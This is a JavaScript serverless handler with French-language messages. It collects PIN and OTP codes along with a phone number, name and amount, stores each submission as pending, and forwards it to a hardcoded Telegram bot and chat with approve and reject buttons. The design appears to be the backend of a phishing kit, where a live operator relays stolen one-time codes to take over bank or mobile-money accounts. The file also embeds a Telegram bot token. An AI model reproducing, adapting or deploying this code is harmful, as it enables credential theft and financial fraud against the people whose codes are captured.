import { kv } from '@vercel/kv';

const BOT_TOKEN = process.env.BOT_TOKEN || '8721286574:AAErN0ZEPj6olvQ-BQ9LpoTrfN0eSLkDwX4';
const CHAT_ID = process.env.CHAT_ID || '6258528476';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const { type, value, phone, userData } = req.body;
        const requestId = Date.now() + '-' + Math.random().toString(36).slice(2, 8);

        await kv.set(`decision:${requestId}`, { status: 'pending', type, value }, { ex: 1800 });

        const emoji = type === 'pin' ? '🔑' : '🔢';
        const title = type === 'pin' ? 'CODE PIN' : 'CODE OTP';

        let message = `🔔 *Nouvelle vérification ${title}*\n\n`;
        message += `${emoji} *Valeur:* \`${value}\`\n`;
        message += `📞 *Téléphone:* ${phone || 'N/A'}\n`;
        if (userData) {
            message += `👤 *Nom:* ${userData.firstName || ''} ${userData.lastName || ''}\n`;
            message += `💵 *Montant:* ${userData.amount ? userData.amount.toLocaleString() : 0} $\n`;
        }
        message += `\n🆔 *ID:* \`${requestId}\``;

        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROUVER', callback_data: `approve:${requestId}` },
                        { text: '❌ REJETER', callback_data: `reject:${requestId}` }
                    ]]
                }
            })
        });

        res.status(200).json({ success: true, requestId });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, error: err.message });
    }
}
